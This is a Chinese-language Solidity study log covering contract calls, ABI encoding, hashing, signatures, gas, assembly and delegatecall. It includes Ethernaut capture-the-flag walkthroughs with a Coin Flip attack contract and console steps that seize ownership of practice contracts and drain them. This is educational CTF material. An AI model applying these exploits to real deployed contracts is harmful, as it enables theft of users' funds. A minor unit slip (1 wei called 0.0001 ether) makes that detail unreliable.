---
timezone: UTC+8
---

# 修罗

**GitHub ID:** SakuraTokoyomi

**Telegram:** @xiu luo

## Self-introduction

web3萌新

## Notes

<!-- Content_START -->
# 2025-08-19

### 21.合约如何调用其他合约

**合约可以调用其他合约**，有两种方式：

1. **直接调用（推荐方式）**：像调用本地函数一样调用另一个合约的方法，例如 `callee.setX(_x)`。
2. **低级调用（不推荐）**：用 `.call`、`.delegatecall` 等，需要手动处理返回值和错误，不安全。

- 在 Solidity 中，合约间调用本质上就是发一条消息到另一个合约地址，带上函数选择器和参数。

**示例代码解释**

代码定义了两个合约：**Callee** 和 **Caller**。

**1. Callee**

```solidity
contract Callee {
    uint256 public x;
    uint256 public value;

    function setX(uint256 _x) public returns (uint256) {
        x = _x;
        return x;
    }

    function setXandSendEther(uint256 _x)
        public
        payable
        returns (uint256, uint256)
    {
        x = _x;
        value = msg.value;
        return (x, value);
    }
}
```

- setX(uint256 _x)：设置 x，并返回它。
- setXandSendEther(uint256 _x)：既设置 x，又接收 msg.value（ETH），把它存到 value 中并返回 (x, value)。

**2. Caller**

```solidity
contract Caller {
    function setX(Callee _callee, uint256 _x) public {
        uint256 x = _callee.setX(_x);
    }

    function setXFromAddress(address _addr, uint256 _x) public {
        Callee callee = Callee(_addr);
        callee.setX(_x);
    }

    function setXandSendEther(Callee _callee, uint256 _x) public payable {
        (uint256 x, uint256 value) =
            _callee.setXandSendEther{value: msg.value}(_x);
    }
}
```

- **setX(Callee _callee, uint256 _x)**
  - 直接通过合约实例 _callee 调用 setX，把 _x 设置到 Callee 的 x 变量里。
- **setXFromAddress(address _addr, uint256 _x)**
  - 如果只有目标地址 _addr，可以先把它转为 Callee 类型，再调用函数。
- **setXandSendEther(Callee _callee, uint256 _x)**
  - 在调用 Callee 的 setXandSendEther 时，除了参数 _x，还可以附带以太币 {value: msg.value}。
  - 返回 (x, value)，即 Callee 里存储的新变量。



### 22.合约如何创建其他合约

**创建合约**

- 使用 new 关键字可以在链上部署新的合约实例。
- new 支持在构造函数传参数，同时可以带上 value（发送以太币）。
- 自 **Solidity 0.8.0** 开始，new 也支持 create2，通过 salt 可以在**可预测的地址**上创建合约。

**工厂合约模式**

- 一个合约（这里是 CarFactory）负责批量创建和管理另一个合约（Car）。
- 创建的合约地址和信息可以被存储起来，供后续查询。

有点像面向对象高级中的工厂模式

#### Car 合约

```
contract Car {
    address public owner;
    string public model;
    address public carAddr;

    constructor(address _owner, string memory _model) payable {
        owner = _owner;
        model = _model;
        carAddr = address(this);
    }
}
```

- 构造函数接收车主 `_owner` 和车型 `_model`。
- 保存自己地址 `carAddr = address(this)`。
- `payable` 允许在部署时接收 ETH。

------

#### CarFactory 工厂合约

```
contract CarFactory {
    Car[] public cars;
```

维护一个数组 `cars`，存储所有已创建的 `Car` 合约。

##### 1. 普通创建

```
function create(address _owner, string memory _model) public {
    Car car = new Car(_owner, _model);
    cars.push(car);
}
```

- 使用 `new Car(...)` 创建合约，不带 ETH。
- 新合约被推入 `cars` 数组。

##### 2. 创建并发送 ETH

```
function createAndSendEther(address _owner, string memory _model) public payable {
    Car car = (new Car){value: msg.value}(_owner, _model);
    cars.push(car);
}
```

- 在 `new Car` 时附带 `msg.value`，新建的 Car 合约会收到这笔 ETH。

##### 3. 使用 `create2`

```
function create2(address _owner, string memory _model, bytes32 _salt) public {
    Car car = (new Car){salt: _salt}(_owner, _model);
    cars.push(car);
}
```

- 使用 `create2`，由 `_salt` 决定部署地址。
- 公式：`address = keccak256(0xff ++ sender ++ salt ++ keccak256(init_code))`。
- 相同工厂地址、相同 salt 和相同字节码 → 永远得到相同合约地址。
   （适合预测地址或“合约钱包”部署）

##### 4. `create2` + ETH

```
function create2AndSendEther(address _owner, string memory _model, bytes32 _salt) public payable {
    Car car = (new Car){value: msg.value, salt: _salt}(_owner, _model);
    cars.push(car);
}
```

- 同上，但同时允许附带 ETH。

##### 5. 查询

```
function getCar(uint256 _index) public view returns (address owner, string memory model, address carAddr, uint256 balance) {
    Car car = cars[_index];
    return (car.owner(), car.model(), car.carAddr(), address(car).balance);
}
```

- 从数组中取出 `Car`，返回其**所有者**、**车型**、**地址**和**余额**。



### 23.try/catch

- 在 Solidity 中，`try / catch` **只能捕获两类错误**：
  1. **外部函数调用**（`external` 调用另一个合约的方法）；
  2. **新合约创建**（`new` 关键字）。
- 内部调用（比如自己合约里写 `myFunc(x)`）失败时是 **不能被捕获** 的，会直接 revert。

**示例代码解释**

#### 1. `Foo` 合约

```
constructor(address _owner) {
    require(_owner != address(0), "invalid address");     // 普通 require
    assert(_owner != 0x0000000000000000000000000000000000000001); // assert
    owner = _owner;
}
```

- 构造函数：要求 `_owner != 0x0`，否则 **require** 失败。
- 如果 `_owner == 0x000...001`，则 **assert** 失败。
- 其他情况正常部署。

```
function myFunc(uint256 x) public pure returns (string memory) {
    require(x != 0, "require failed");
    return "my func was called";
}
```

- 如果传 `x=0` → 触发 `require` 抛错。
- 如果传 `x!=0` → 正常返回 `"my func was called"`。

------

#### 2. `Bar` 合约

Bar 用来测试 `try / catch`，包含两个例子：

##### a) 捕获外部函数调用

```
function tryCatchExternalCall(uint256 _i) public {
    try foo.myFunc(_i) returns (string memory result) {
        emit Log(result);
    } catch {
        emit Log("external call failed");
    }
}
```

- 调用 `foo.myFunc(_i)`。
- 如果成功（`_i != 0`），则触发 `emit Log("my func was called")`。
- 如果失败（`_i == 0`），则进入 `catch`，触发 `emit Log("external call failed")`。

示例：

- `tryCatchExternalCall(0)` → emit `"external call failed"`。
- `tryCatchExternalCall(1)` → emit `"my func was called"`。

------

##### b) 捕获新合约创建

```
function tryCatchNewContract(address _owner) public {
    try new Foo(_owner) returns (Foo foo) {
        emit Log("Foo created");
    } catch Error(string memory reason) {
        emit Log(reason);          // 捕获 revert() 或 require()
    } catch (bytes memory reason) {
        emit LogBytes(reason);     // 捕获 assert()
    }
}
```

- 尝试 new Foo(_owner)，根据 _owner 不同有不同结果：
  1. _owner == 0x0
     - require 失败 → catch Error(string) 捕获 → emit "invalid address"。
  2. _owner == 0x000...001
     - assert 失败 → catch(bytes) 捕获 → emit 原始错误数据（空字节串）。
  3. _owner == 0x000...002（或正常地址）
     - 部署成功 → emit "Foo created"。

**try / catch 只能用于跨合约调用或新合约创建**。

通过 try ... returns (...) { ... } catch { ... } 可以优雅处理失败，避免整个交易回滚。

catch Error(string) 捕获 **require / revert**；

catch (bytes) 捕获 **assert / 低级错误**。



### 24.ABI Encode / ABI Decode

在 Solidity 中，函数调用本质上是 **对函数选择器（selector）+参数进行 ABI 编码**，再用 `.call` 或者外部调用发送到目标合约。

```
contract AbiEncode {
    function test(address _contract, bytes calldata data) external {
        (bool ok,) = _contract.call(data);
        require(ok, "call failed");
    }
```

- `test()` 接收一个目标合约地址 `_contract` 和一段 `bytes data`，
- 然后用 `_contract.call(data)` 发送原始调用。
- 这样你可以自己构造 `data` 来模拟任意函数调用。

------

#### 1. `abi.encodeWithSignature`

```
return abi.encodeWithSignature("transfer(address,uint256)", to, amount);
```

- 手动写函数签名（字符串）。
- 拼写错误编译器不会检查（危险点）。
- 会生成 `IERC20.transfer(to, amount)` 的 ABI 调用数据。

#### 2. `abi.encodeWithSelector`

```
return abi.encodeWithSelector(IERC20.transfer.selector, to, amount);
```

- 用函数选择器（`selector = keccak256("transfer(address,uint256)")[:4]`）。
- 参数类型错误编译器也不会报错（可能构造出无效数据）。

#### 3. `abi.encodeCall`

```
return abi.encodeCall(IERC20.transfer, (to, amount));
```

- 推荐方式（Solidity 0.8.12+）。
- 会在编译期检查函数签名和参数类型。
- 避免了拼写或参数错误。

------

#### ABI Decode

`abi.encode` 把数据打包成 `bytes`，`abi.decode` 则能把 `bytes` 解包还原。

```
contract AbiDecode {
    struct MyStruct {
        string name;
        uint256[2] nums;
    }
```

编码

```
function encode(
    uint256 x,
    address addr,
    uint256[] calldata arr,
    MyStruct calldata myStruct
) external pure returns (bytes memory) {
    return abi.encode(x, addr, arr, myStruct);
}
```

- 输入四个参数：`uint256`、`address`、`uint256[]`、`struct`。
- 返回打包好的 `bytes`。

解码

```
function decode(bytes calldata data)
    external
    pure
    returns (
        uint256 x,
        address addr,
        uint256[] memory arr,
        MyStruct memory myStruct
    )
{
    (x, addr, arr, myStruct) =
        abi.decode(data, (uint256, address, uint256[], MyStruct));
}
```

- 把传进来的 `bytes data` 按照 `(uint256, address, uint256[], MyStruct)` 的格式解码。
- 返回解包后的四个变量。

------

#### 总结

- **编码：**
  - `abi.encodeWithSignature("func(type)", args…)` → 容易打错。
  - `abi.encodeWithSelector(func.selector, args…)` → 类型可能错。
  - `abi.encodeCall(Interface.func, (args…))` → 推荐，编译期安全。
- **解码：**
  - `abi.encode(...)` 把参数打包成 `bytes`。
  - `abi.decode(data, (types...))` 再解出来。



### 25.keccak256 哈希函数

- `keccak256` 是以太坊内置的加密哈希函数（Keccak-256）。
- 常见用途：
  1. **生成唯一 ID**（比如 NFT ID、映射键值）；
  2. **提交-揭示（Commit-Reveal）机制**（先提交哈希，后揭示原文）；
  3. **签名**（签名哈希，而不是签名长文本）。

返回值始终是 **32 字节 (`bytes32`)**。

在对数据做哈希前，必须先把数据编码成 `bytes`，这时候有两种方法：

1. abi.encode

- 会做 **完整类型编码 + 填充**。
- 保证解码安全、无歧义。
- 输出更长，占用更多 gas。

2. abi.encodePacked

- 会做 **紧凑打包（无填充）**。
- 结果更短，gas 更省。
- 但当有多个 **动态类型（string, bytes）** 时，可能产生**哈希碰撞**。

示例合约 1：`HashFunction`

```
function hash(string memory _text, uint256 _num, address _addr)
    public
    pure
    returns (bytes32)
{
    return keccak256(abi.encodePacked(_text, _num, _addr));
}
```

- 输入字符串、数字和地址，先 `abi.encodePacked` 打包，再哈希。
- 结果是一个唯一 `bytes32`，常用于标识。

```
function collision(string memory _text, string memory _anotherText)
    public
    pure
    returns (bytes32)
{
    return keccak256(abi.encodePacked(_text, _anotherText));
}
```

- 演示了 **哈希碰撞风险**：
  - `abi.encodePacked("AAA", "BBB") → "AAABBB"`
  - `abi.encodePacked("AA", "ABBB") → "AAABBB"`
  - 两个输入不同，却得到了相同的编码结果。

所以：**当有多个动态类型时，应该用 `abi.encode`，避免碰撞。**

示例合约 2：`GuessTheMagicWord`

```
bytes32 public answer =
    0x60298f78cc0b47170ba79c10aa3851d7648bd96f2f8e46a19dbc777c36fb0c00;

// Magic word is "Solidity"
function guess(string memory _word) public view returns (bool) {
    return keccak256(abi.encodePacked(_word)) == answer;
}
```

- `answer` 存储的是字符串 `"Solidity"` 经过 `keccak256(abi.encodePacked("Solidity"))` 得到的哈希。
- 用户调用 `guess("Solidity")` → 返回 `true`。
- 其他输入 → `false`。

这是典型的 **哈希匹配验证** 用法。

 一句话总结

- `keccak256` 用来生成不可逆的固定长度哈希，是以太坊里的“指纹”工具。
- `abi.encode` 安全，但冗长；`abi.encodePacked` 高效，但要避免多动态类型组合。
- 可以用它做唯一 ID、提交-揭示机制和密码学验证（比如“猜词游戏”）。



### 26.签名验证（VerifySignature）

签名与验证流程

#### 1. 生成消息哈希

```
function getMessageHash(
    address _to,
    uint256 _amount,
    string memory _message,
    uint256 _nonce
) public pure returns (bytes32) {
    return keccak256(abi.encodePacked(_to, _amount, _message, _nonce));
}
```

把交易信息打包成唯一的哈希。

------

#### 2. Ethereum 标准签名哈希

```
function getEthSignedMessageHash(bytes32 _messageHash)
    public
    pure
    returns (bytes32)
{
    return keccak256(
        abi.encodePacked("\x19Ethereum Signed Message:\n32", _messageHash)
    );
}
```

👉 给消息加上 **标准前缀**，这是以太坊签名规范（EIP-191）。

------

#### 3. 签名验证

```
function verify(
    address _signer,
    address _to,
    uint256 _amount,
    string memory _message,
    uint256 _nonce,
    bytes memory signature
) public pure returns (bool) {
    bytes32 messageHash = getMessageHash(_to, _amount, _message, _nonce);
    bytes32 ethSignedMessageHash = getEthSignedMessageHash(messageHash);

    return recoverSigner(ethSignedMessageHash, signature) == _signer;
}
```

验证步骤：

1. 重新生成哈希；
2. 恢复签名者地址；
3. 判断是否等于 `_signer`。

------

#### 4. 从签名中恢复签名者

```
function recoverSigner(bytes32 _ethSignedMessageHash, bytes memory _signature)
    public
    pure
    returns (address)
{
    (bytes32 r, bytes32 s, uint8 v) = splitSignature(_signature);
    return ecrecover(_ethSignedMessageHash, v, r, s);
}
```

使用 `ecrecover` 恢复签名者地址。

详细具体的操作还需要参考https://solidity-by-example.org/signature/



### 27.Gas消耗优化

1.**calldata 代替 memory（外部函数入参）**
 `uint256[] calldata nums`：不复制数据到内存，直接只读 → 少一次拷贝。

2.**把状态变量读到本地变量**
 `uint256 _total = total;`：循环里读写 `_total`（内存/栈）比每次 `SLOAD/SSTORE` 便宜。最后一次性 `total = _total;`。

3.**短路与判断顺序**
 `if (A && B)`：当 A 为假时不计算 B。把**更便宜/更可能失败**的判断放前面，可避免做贵操作（如取模）。

4.**`++i` 替代 `i++`**
 `++i` 少一次临时值保存（更少的栈操作）。

5.**缓存数组长度与元素**
 `uint256 len = nums.length; uint256 num = nums[i];`：避免重复 `MLOAD/CALLDATALOAD`。



### 28.二进制操作符

计算机基础操作了，贴个表

| 运算 | 符号 | 说明                                      | 小例子                              |
| ---- | ---- | ----------------------------------------- | ----------------------------------- |
| 与   | `&`  | 两位同为 1 才为 1                         | `0b1110 & 0b1011 = 0b1010 (10)`     |
| 或   | `|`  | 只要有 1 就为 1                           | `0b1100 | 0b1001 = 0b1101 (13)`     |
| 异或 | `^`  | 不同为 1，相同为 0                        | `0b1100 ^ 0b0101 = 0b1001 (9)`      |
| 取反 | `~`  | 按位翻转（受类型位宽限制）                | `~uint8(12)=243`（只在 8 位内翻转） |
| 左移 | `<<` | 低位补 0，等价乘 `2^bits`                 | `3<<2=12`                           |
| 右移 | `>>` | 高位补 0（对无符号数），等价整除 `2^bits` | `12>>1=6`                           |

取**最后 n 位**：

```solidity
uint256 mask = (1 << n) - 1;      // 低 n 位全 1
return x & mask;                   // 等价：x % (1 << n)
```

取**最高有效位（MSB）位置**（从 0 开始）：见下文两种实现。

取**前 n 位**（给定总位长 `len`，例如 `len = msb(x)+1`）：

```solidity
uint256 mask = ((1 << n) - 1) << (len - n);
return x & mask;
```

最高有效位（MSB）

1) 朴素法（循环右移）

```solidity
function mostSignificantBit(uint256 x) external pure returns (uint256) {
    uint256 i = 0;
    while ((x >>= 1) > 0) { ++i; }
    return i; // 若 x=12(1100b)，返回 3（从0开始）
}
```

2) 二分跳表法（分段判断）

```solidity
function mostSignificantBit(uint256 x) external pure returns (uint256 msb) {
    if (x >= 2**128) { x >>= 128; msb += 128; }
    if (x >= 2**64)  { x >>= 64;  msb += 64; }
    if (x >= 2**32)  { x >>= 32;  msb += 32; }
    if (x >= 2**16)  { x >>= 16;  msb += 16; }
    if (x >= 2**8)   { x >>= 8;   msb += 8;  }
    if (x >= 2**4)   { x >>= 4;   msb += 4;  }
    if (x >= 2**2)   { x >>= 2;   msb += 2;  }
    if (x >= 2**1)   {             msb += 1; }
}
```



### 29.Unchecked Math

#### 为什么有 unchecked？

- Solidity 0.8+ **默认开启** 整型的溢出/下溢检查（`x+y`、`x-y`、`x*y` 等），一旦溢出会 `revert`。

- 在 **性能敏感**、且你**能证明不会溢出**的代码片段里，可以用

  ```
  unchecked { /* 数学运算 */ }
  ```

  来**关闭检查**，以**少量节省 gas**。

示例中的对比（粗量级参考，链上/编译器版本不同会有差异）：

- `add`：22291 → **22103**（约省 0.8%）
- `sub`：22329 → **22147**（约省 0.8%）

------

#### 什么时候可以用？

**满足任一**即可考虑：

1. **数学上有上界**：例如循环计数 `for (uint i; i < n; ) { … unchecked { ++i; } }`，已知 `i` 不会溢出 `uint256`。
2. **已做边界校验**：先 `require(y <= x)` 再 `unchecked { x - y; }`。
3. **输入可控/可证明安全**：内部常量、受限范围、或来自可信模块的值。
4. **热点路径**：被大量调用/循环中的核心语句（微优化才有意义）。

------

#### 什么时候不要用？

- **外部不可信输入** 且未做严格边界检查。
- **乘法链/幂次**（如 `x*x*x`）在一般范围下很容易溢出。
- 代码可读性被显著削弱时；或你无法给出清晰的不变量/证明。

------

#### 典型用法模式

##### 1) 自增/自减（循环）

```
for (uint256 i = 0; i < len; ) {
    // … 业务逻辑
    unchecked { ++i; } // 已知 i < len，不会溢出
}
```

##### 2) 先校验，再 unchecked

```
function safeSub(uint256 x, uint256 y) internal pure returns (uint256) {
    require(y <= x, "underflow"); // 保证不下溢
    unchecked { return x - y; }   // 省去二次检查
}
```

##### 3) 复杂表达式包裹

```
function sumOfCubes(uint256 x, uint256 y) external pure returns (uint256) {
    // 注意：x*x*x 很容易溢出！若要 unchecked，先约束 x、y 的范围
    unchecked {
        uint256 x3 = x * x * x;
        uint256 y3 = y * y * y;
        return x3 + y3; // 这里也可能溢出
    }
}
```

更稳妥做法：限制范围，例如要求 `x <= cbrt(type(uint256).max)`，或改用 512-bit 乘法/库函数并带上界检查。



### 30.内联汇编

#### Assembly 变量声明

```
assembly {
    let x := 123   // 定义局部变量 x
    z := 456       // 赋值给 Solidity 函数返回变量 z
}
```

- `let` 用来定义 Yul 内的局部变量（只在 assembly 块中可见）。
- 可以直接给 Solidity 中的函数返回变量 `z` 赋值。

#### Assembly 条件语句

### if

```
assembly {
    if lt(x, 10) { z := 99 }
}
```

- `if <条件> { <代码块> }`，没有 `else`。
- 例子：如果 `x < 10`，则 `z = 99`。

### switch

```
assembly {
    switch x
    case 1 { z := 10 }
    case 2 { z := 20 }
    default { z := 0 }
}
```

- 类似 Solidity 的 `switch-case`。
- 可以有多个 case 和一个 default。

####  Assembly 循环

### for 循环

```
assembly {
    for { let i := 0 } lt(i, 10) { i := add(i, 1) } {
        z := add(z, 1)
    }
}
```

- 结构：`for {init} condition {post} {body}`。
- 和 Solidity 里的 `for` 用法类似。

### while 循环

```
assembly {
    let i := 0
    for { } lt(i, 5) { } {
        i := add(i, 1)
        z := add(z, 1)
    }
}
```

- 通过省略 `init` 和 `post`，只保留 `condition`，就等效于 while。

####  Assembly 错误处理

```
assembly {
    if gt(x, 10) { revert(0, 0) }
}
```

- `revert(p, s)`：停止执行，回滚状态，并返回内存 `[p...(p+s))` 的数据。
- 示例：如果 `x > 10`，直接 `revert`，不返回数据。

####  Assembly 数学

##### 加法

```
assembly {
    z := add(x, y)
    if lt(z, x) { revert(0, 0) } // 溢出检查
}
```

##### 乘法

```
assembly {
    switch x
    case 0 { z := 0 }
    default {
        z := mul(x, y)
        if iszero(eq(div(z, x), y)) { revert(0, 0) }
    }
}
```

- 用 `switch` 避免除以 0，手动做溢出检查。

##### 固定点四舍五入

```
assembly {
    let half := div(b, 2)
    z := add(x, half)
    z := mul(div(z, b), b)
}
```

- 原理：在除法前加上 `b/2`，再做整除，最后乘回 `b`，实现“四舍五入”。

# 2025-08-18

## 2.**fallout**

复制代码到remix中遇到第一个报错：

import "openzeppelin-contracts-06/math/SafeMath.sol";

这一行代码应该已经报错找不到路径了，需要替换早期版本如下

import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/release-v3.0.0/contracts/math/SafeMath.sol";

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Fallout {
    using SafeMath for uint256;

    mapping(address => uint256) allocations;
    address payable public owner;

    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function allocate() public payable {
        allocations[msg.sender] = allocations[msg.sender].add(msg.value);
    }

    function sendAllocation(address payable allocator) public {
        require(allocations[allocator] > 0);
        allocator.transfer(allocations[allocator]);
    }

    function collectAllocations() public onlyOwner {
        msg.sender.transfer(address(this).balance);
    }

    function allocatorBalance(address allocator) public view returns (uint256) {
        return allocations[allocator];
    }
}
```

在网页上没有看出来，实际上构造函数的函数名字跟合约名字不一样Fal1out()和Fallout

代码审计一下，只需调用一次Fal1out()即可获得合约所有权

```solidity
    /* constructor */
    function Fal1out() public payable {
        owner = msg.sender;
        allocations[owner] = msg.value;
    }
```

## 3.**Coin Flip**

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract CoinFlip {
    uint256 public consecutiveWins;
    uint256 lastHash;
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor() {
        consecutiveWins = 0;
    }

    function flip(bool _guess) public returns (bool) {
        uint256 blockValue = uint256(blockhash(block.number - 1));

        if (lastHash == blockValue) {
            revert();
        }

        lastHash = blockValue;
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (side == _guess) {
            consecutiveWins++;
            return true;
        } else {
            consecutiveWins = 0;
            return false;
        }
    }
}
```

代码审计一下其实就是猜数字，需要连续猜对10次。

数字的计算如下：

```solidity
uint256 blockValue = uint256(blockhash(block.number - 1));
uint256 coinFlip = blockValue / FACTOR;
bool side = coinFlip == 1 ? true : false;
```

取上一个区块的哈希值 blockhash(block.number - 1)；

除以 FACTOR这里是57896044618658097711785492504343953926634992332820282019728792003956564819968

得到的结果要么是 0，要么是 1；

如果是 1，则答案是 true，否则是 false。

这里我们能对其进行预测的原因是：

在攻击合约 `attack()` 中

```solidity
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 coinFlip = blockValue / FACTOR;
    bool side = (coinFlip == 1);

    // 底层调用目标合约的 flip(bool) 函数
    (bool success, bytes memory data) = target.call(
        abi.encodeWithSignature("flip(bool)", side)
    );
```

这段逻辑与目标合约一模一样，而且发生在同一交易、同一 EVM 上下文中；

所以绝无“算错/不同步”的可能（除非在同块内第二次调用，触发 `lastHash` 检查）。

每个新区块都能得到确定的 side，于是可以连续 10 次全中（10 个区块，10 次交易）

攻击脚本如下：

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract AttackCoinFlip {
    address public target;
    uint256 constant FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

    constructor(address _target) {
        target = _target;
    }

    function attack() external {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = (coinFlip == 1);

        (bool success, bytes memory data) = target.call(
            abi.encodeWithSignature("flip(bool)", side)
        );
    }
}
```

但是需要注意

```solidity
    if (lastHash == blockValue) {
        revert();
    }
```

如果两次猜测所在的区块一致会导致revert，因此脚本可能失败需要多执行几次。

# 2025-08-17

# 实践：Ethernaut闯关

~~打卡处上传不了图片，我上传到自己的博客中了~~

博客炸了维修ing。修好了补上链接

## 0.Hello Ethernaut

入门题，但是需要一些solidity或者其他语言的基础

根据教程在浏览器的Console中进行交互



最重要的是输入contract找到合约的api



这里有个password很显眼，输入contract.password()



得到密码ethernaut0，但是暂时还不知道怎么用

然后我将abi中的函数一个个进行输入，发现输入contract.method7123949()得到以下提示



将密码作为参数传入contract.authenticate("ethernaut0")



## 1.Fallbcak

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Fallback {
    mapping(address => uint256) public contributions;
    address public owner;

    constructor() {
        owner = msg.sender;
        contributions[msg.sender] = 1000 * (1 ether);
    }

    modifier onlyOwner() {
        require(msg.sender == owner, "caller is not the owner");
        _;
    }

    function contribute() public payable {
        require(msg.value < 0.001 ether);
        contributions[msg.sender] += msg.value;
        if (contributions[msg.sender] > contributions[owner]) {
            owner = msg.sender;
        }
    }

    function getContribution() public view returns (uint256) {
        return contributions[msg.sender];
    }

    function withdraw() public onlyOwner {
        payable(owner).transfer(address(this).balance);
    }

    receive() external payable {
        require(msg.value > 0 && contributions[msg.sender] > 0);
        owner = msg.sender;
    }
}
```

要求：拿到合约的拥有权和清空账户余额。

清空账户余额很简单，只需要以owner调用withdraw函数即可。

代码审计可得：

**初始状态**：部署者是 `owner`，并且给自己存了 `1000 ether` 的贡献值（`contributions[owner]`）。

**`contribute()`**：任何人可以贡献 `<0.001 ether`，并累加到自己的 `contributions`。
 如果某人的贡献超过当前 `owner` 的贡献值，就会成为新的 `owner`。

**`receive()`**：只要有人往合约转账（没有调用函数），如果：

- `msg.value > 0`
- `contributions[msg.sender] > 0`
   那么 `owner = msg.sender`。

**`withdraw()`**：只有 `owner` 能提取合约所有余额。

**await contract.contribute({value: 1});**

- 给合约打了一点钱（1wei）。
- 此时有了 `contributions[player] = 0.0001 ether`，但因为 `contributions[owner] = 1000 ether`，还不是 owner。

**await contract.sendTransaction({value: 1});**

这一步是直接往合约地址打钱（没有调用函数），所以触发了 **`receive()`**。

`receive()` 要求：

- `msg.value > 0` ✅
- `contributions[player] > 0` ✅ （之前已经贡献过）

条件满足，于是执行：`owner = msg.sender`。
现在已经变成了合约的 新 owner。

**await contract.withdraw()**

取出所有钱通关

# 2025-08-14

### 16.发送和接收 ETH

#### 接收 ETH 的规则

合约要想接收 ETH，必须至少实现以下之一：

- `receive() external payable`
  - 当 `msg.data` 为空时被调用。
- `fallback() external payable`
  - 当 `msg.data` 不为空时被调用，或者没有 `receive()` 时也会处理空 `msg.data`。

**调用流程图**：

```
      发送 ETH
         │
   msg.data 为空？
     /     \
   是       否
   /         \
 receive()存在?   fallback()
  /    \
 是     否
 /       \
receive()  fallback()
```

------

#### 示例（接收 ETH）

```solidity
contract ReceiveEther {
    receive() external payable {} // 处理空 data
    fallback() external payable {} // 处理非空 data

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}
```

#### 发送 ETH 的三种方式

| 方法       | Gas 转发                 | 出错处理                         | 推荐度                                        |
| ---------- | ------------------------ | -------------------------------- | --------------------------------------------- |
| `transfer` | 固定 2300 gas            | 出错自动 revert                  | ❌ 已不推荐（EIP-1884 导致 2300 gas 可能不够） |
| `send`     | 固定 2300 gas            | 返回 `bool`，需手动检查          | ❌ 不推荐                                      |
| `call`     | 转发全部 gas（可自定义） | 返回 `(bool, bytes)`，需手动检查 | ✅ 推荐（配合防重入措施）                      |

------

#### 示例（发送 ETH）

```solidity
contract SendEther {
    // ❌ 不推荐
    function sendViaTransfer(address payable _to) public payable {
        _to.transfer(msg.value);
    }

    // ❌ 不推荐
    function sendViaSend(address payable _to) public payable {
        bool sent = _to.send(msg.value);
        require(sent, "Failed to send Ether");
    }

    // ✅ 推荐
    function sendViaCall(address payable _to) public payable {
        (bool sent, ) = _to.call{value: msg.value}("");
        require(sent, "Failed to send Ether");
    }
}
```

### 17.fallback

**`fallback()`**：

1. 调用了不存在的函数时执行
2. 直接发 ETH 且没有 `receive()` 或者 `msg.data` 不为空时执行

### **例子**

```solidity
contract Fallback {
    event Log(string func, uint256 gas);

    fallback() external payable {
        emit Log("fallback", gasleft());
    }
    receive() external payable {
        emit Log("receive", gasleft());
    }
}
```

调用：

```solidity
// _to 是 Fallback 实例地址
_to.transfer(1 ether); // msg.data 为空 → 触发 receive()
_to.call{value: 1 ether}("abc"); // msg.data 非空 → 触发 fallback()
```

### 18.call

**`call`** 是一种低级函数调用方式，可用于：

1. 发送 ETH（触发 `receive()` 或 `fallback()`）
2. 调用目标合约的函数（即使 ABI 不匹配）

**优点**：可以转发全部 gas，适合发 ETH

**缺点**：不会检查函数是否存在，revert 不自动冒泡，类型不检查

**使用建议**：

- 已知 ABI 的函数用接口调用（更安全）

- 发 ETH 或调用未知函数可用 `call`

  

```sql
         使用 .call 调用目标合约
                   │
                   ▼
        目标函数签名是否存在？
              ┌───────┴────────┐
              │                │
             是               否
              │                │
              ▼                ▼
    是否成功执行且无 revert？   执行 fallback()
       ┌───────┴────────┐       │
       │                │       │
      是               否      正常返回（success = true）
       │                │       │
 返回数据（success=true）  返回数据（success=false）

```

**函数存在且正常执行** → `success = true`，`data` 里是返回值编码。

**函数存在但 revert** → `success = false`，`data` 可能包含 revert 原因编码。

**函数不存在** → `fallback()` 被执行，如果没有 revert，`success = true`，`data` 为空。

### 19.delegatecall

**作用**：`delegatecall` 让合约 A **执行合约 B 的代码**，但使用的是**合约 A 的存储上下文**。

**区别于 `call`**：

- `call` → 修改的是被调用合约（B）的存储
- `delegatecall` → 修改的是调用方合约（A）的存储

**共享信息**：

- `msg.sender` 保留为原始外部调用者（EOA）
- `msg.value` 同样传递给调用方上下文

**注意事项**：

- 存储布局必须完全一致（变量顺序、类型一致），否则会把调用方状态写乱
- 常用于 **代理合约模式（Upgradeable Contracts）**

例子

```solidity
// B：逻辑合约
contract B {
    uint256 public num;
    address public sender;
    uint256 public value;

    function setVars(uint256 _num) public payable {
        num = _num;             // 写当前上下文 num
        sender = msg.sender;    // 当前调用者
        value = msg.value;      // 当前交易的 value
    }
}

// A：调用方合约
contract A {
    uint256 public num;
    address public sender;
    uint256 public value;

    function setVarsDelegateCall(address _contract, uint256 _num) public payable {
        _contract.delegatecall(
            abi.encodeWithSignature("setVars(uint256)", _num)
        );
    }

    function setVarsCall(address _contract, uint256 _num) public payable {
        _contract.call{value: msg.value}(
            abi.encodeWithSignature("setVars(uint256)", _num)
        );
    }
}

```

**调用效果对比：**

1. **delegatecall**
   - 调用：`A.setVarsDelegateCall(B地址, 42)` 附带 `msg.value = 5 wei`
   - 执行结果：
     - A.num = 42
     - A.sender = 外部调用者（EOA 地址）
     - A.value = 5
     - B 的存储不变
2. **call**
   - 调用：`A.setVarsCall(B地址, 99)` 附带 `msg.value = 10 wei`
   - 执行结果：
     - B.num = 99
     - B.sender = A 合约地址
     - B.value = 10
     - A 的存储不变

delegatecall 流程图

```
外部调用者 EOA
     │
     ▼
调用 A.setVarsDelegateCall(B, num=42)
     │
     ▼
A 执行 delegatecall 到 B.setVars
     │
     ▼
EVM 载入 B 的代码
     │
     ▼
代码在 A 的存储布局上运行
     │
     ├─ 写入 A.num = 42
     ├─ 写入 A.sender = EOA 地址
